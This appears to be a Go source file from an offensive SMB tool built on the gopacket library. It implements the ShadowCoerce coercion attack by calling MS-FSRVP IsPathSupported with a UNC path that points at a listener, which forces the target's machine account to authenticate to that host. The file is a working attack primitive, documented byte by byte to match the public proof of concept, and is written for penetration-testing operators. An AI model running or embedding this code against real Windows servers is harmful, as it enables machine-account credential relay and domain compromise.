package smbclient

import (
	"bytes"
	"encoding/binary"
	"errors"
	"fmt"
	"os"
	"strings"
	"time"

	"github.com/mandiant/gopacket/pkg/dcerpc"
	"github.com/mandiant/gopacket/pkg/smb"
)

// fsrvpUUID is the MS-FSRVP FileServerVssAgent interface, v1.0, served on
// \pipe\FssagentRpc. Source: MS-FSRVP Appendix A full IDL (uuid A8E0653C-
// 2744-4389-A61D-7373DF8B2292, version 1.0). internal/scan/uuids.go holds
// the same value for endpoint-mapper annotation; duplicated here because
// smbclient must not import the scan package.
var fsrvpUUID = dcerpc.MustParseUUID("a8e0653c-2744-4389-a61d-7373df8b2292")

// opFSRVPIsPathSupported is the ShadowCoerce trigger opnum (MS-FSRVP IDL
// method order: GetSupportedVersion=0 ... AbortShadowCopySet=7,
// IsPathSupported=8, IsPathShadowCopied=9). IsPathShadowCopied takes the
// identical single UNC argument and is equally coercive; IsPathSupported is
// the call the reference PoC (github.com/ShutdownRepo/ShadowCoerce, from
// topotam's finding) actually fires — its IsPathShadowCopied path ships
// commented out — so we match the reference byte-for-byte. Unlike the
// stateful shadow-copy ops it needs no prior SetContext/StartShadowCopySet.
const opFSRVPIsPathSupported = 8

// fsrvpEAccessDenied is the method-level HRESULT the FSS agent returns when
// the caller's token fails the interface ACL (MS-ERREF 2.1.1: HRESULT from
// Win32 ERROR_ACCESS_DENIED). The check runs BEFORE the UNC path is
// touched, so unlike every other status it guarantees no callback fired.
const fsrvpEAccessDenied = 0x80070005

// CoerceShadowCoerce triggers the ShadowCoerce machine-account coercion
// primitive against the session target: it hands the target's File Server
// VSS Agent a UNC path pointing at listener (\\<listener>\share), and the
// agent — File Server service code running as SYSTEM — opens an SMB
// session to listener with the target's machine account while deciding
// whether a VSS provider backs the path. The share component need not
// exist on the listener: the authentication completes during SMB session
// setup, before any tree connect (the reference PoC uses \NETLOGON only
// because real share names make the follow-up tree connect succeed and the
// RPC return cleanly; the callback fires either way).
//
// A nil return means the trigger was DELIVERED — whether the machine
// account actually called home is the listener's story (the shell pairs
// this with ListenForCallback). The agent's own return status is ignored:
// FSRVP_E_NOT_SUPPORTED (0x8004230C) and FSRVP_E_OBJECT_NOT_FOUND
// (0x80042308) are the routine answers AFTER a successful coercion, so the
// status is noise, not signal. The one exception is E_ACCESSDENIED, which
// aborts before path processing. A pipe-open or service-off failure maps
// to the themed "File Server VSS Agent not available" message — the
// fssagent service is disabled by default on Windows Server, so that is
// the common case, not an exceptional one.
func (s *Session) CoerceShadowCoerce(listener string) error {
	rpc, cleanup, err := s.openFSSAgent()
	if err != nil {
		return err
	}
	defer cleanup()

	resp, err := rpc.Call(opFSRVPIsPathSupported, isPathSupportedRequest(shadowCoerceUNC(listener)))
	if err != nil {
		return mapFSSAgentError(fmt.Errorf("IsPathSupported: %v", err))
	}
	return isPathSupportedResult(resp)
}

// shadowCoerceUNC builds the bait path handed to the target's FSS agent.
func shadowCoerceUNC(listener string) string {
	return `\\` + listener + `\share`
}

// openFSSAgent opens and binds the FssagentRpc pipe; cleanup closes the
// pipe. The File Server VSS Agent service is demand-start, so the first
// pipe open can race listener registration — same "listening state" retry
// as openWinreg. A missing pipe means the service is disabled or the File
// Server role is absent; mapFSSAgentError turns that into the themed
// "not available" message rather than a raw NTSTATUS.
func (s *Session) openFSSAgent() (*dcerpc.Client, func(), error) {
	pipe, err := s.client.OpenPipe("FssagentRpc")
	if err != nil && strings.Contains(err.Error(), "listening state") {
		time.Sleep(1500 * time.Millisecond)
		pipe, err = s.client.OpenPipe("FssagentRpc")
	}
	if err != nil {
		return nil, nil, mapFSSAgentError(err)
	}
	rpc := dcerpc.NewClient(pipe)
	if err := rpc.Bind(fsrvpUUID, 1, 0); err != nil {
		pipe.Close()
		return nil, nil, mapFSSAgentError(fmt.Errorf("bind FssagentRpc: %v", err))
	}
	return rpc, func() { pipe.Close() }, nil
}

// isPathSupportedRequest marshals the IsPathSupported request stub. The IDL
// parameter is [in] [string] LPWSTR ShareName — a TOP-LEVEL pointer, and
// top-level pointers in DCE IDL marshal as REFERENCE pointers (MS-RPCE
// 2.2.4.9; the interface's pointer_default(unique) applies only to embedded
// pointers), so there is NO referent ID on the wire: the conformant-varying
// string follows inline — MaxCount, Offset=0, ActualCount (UTF-16 code
// units including the NUL terminator), UTF-16LE data, padded to 4 bytes.
// That is byte-identical to impacket's dtypes.WSTR (a bare NDRSTRUCT, not
// an NDRPOINTER), which is what the ShadowCoerce reference PoC assigns to
// ShareName, and identical to svcctl's lpServiceName here (openService) —
// writeWideStringNDR is that exact encoder.
func isPathSupportedRequest(unc string) []byte {
	buf := new(bytes.Buffer)
	writeWideStringNDR(buf, unc)
	return buf.Bytes()
}

// isPathSupportedResult inspects the response's trailing method-return
// DWORD. Response stub layout (IDL out-params in order): BOOL
// SupportedByThisProvider (4 bytes) + LPWSTR* OwnerMachineName (4-byte
// referent, plus the deferred string when non-NULL) + return DWORD — the
// return value is therefore always the final 4 bytes whatever the
// OwnerMachineName state. See CoerceShadowCoerce for why every status but
// E_ACCESSDENIED still counts as a delivered trigger.
func isPathSupportedResult(resp []byte) error {
	if len(resp) < 12 {
		return fmt.Errorf("short IsPathSupported response (%d bytes)", len(resp))
	}
	if status := binary.LittleEndian.Uint32(resp[len(resp)-4:]); status == fsrvpEAccessDenied {
		return fmt.Errorf("access denied")
	}
	return nil
}

// errFSSAgentUnavailable renders the themed "service off / role absent"
// message; detail names the checkpoint that failed.
func errFSSAgentUnavailable(detail string) error {
	return fmt.Errorf("File Server VSS Agent not available on the target (%s)", detail)
}

// mapFSSAgentError translates FssagentRpc pipe-open/bind/call failures into
// plain language. The File Server VSS Agent service is DISABLED by default
// (it ships with the File Server role and only runs on demand), so the
// everyday failures — no pipe, interface not on the pipe, unknown opnum —
// all mean "not available", not an RPC fault worth dumping on the operator.
// Typed checks must come first: OpenPipe's *smb2.ResponseError carries the
// NTSTATUS only until something upstream flattens it with %v.
func mapFSSAgentError(err error) error {
	switch {
	case smb.IsNotFound(err):
		return errFSSAgentUnavailable("FssagentRpc pipe not found — service disabled or File Server role not installed")
	case errors.Is(err, os.ErrPermission):
		// The pipe exists but its ACL rejects the session user — the agent
		// IS available; this is a plain denial, not the absent-service case.
		return fmt.Errorf("access denied")
	}
	msg := err.Error()
	switch {
	case strings.Contains(msg, "listening state"):
		// Still no listener after the demand-start retry in openFSSAgent.
		return errFSSAgentUnavailable("FssagentRpc pipe not listening — the demand-start service did not come up")
	case strings.Contains(msg, "bind rejected"), // BindNak: interface not registered on the pipe
		strings.Contains(msg, "0x1c000003"), // nca_s_unk_if — pipe served, FSRVP interface unregistered
		strings.Contains(msg, "0x1c010002"): // nca_s_op_rng_error — opnum 8 unimplemented (Samba partial FSRVP)
		return errFSSAgentUnavailable("MS-FSRVP interface not registered on the FssagentRpc pipe")
	}
	return err
}
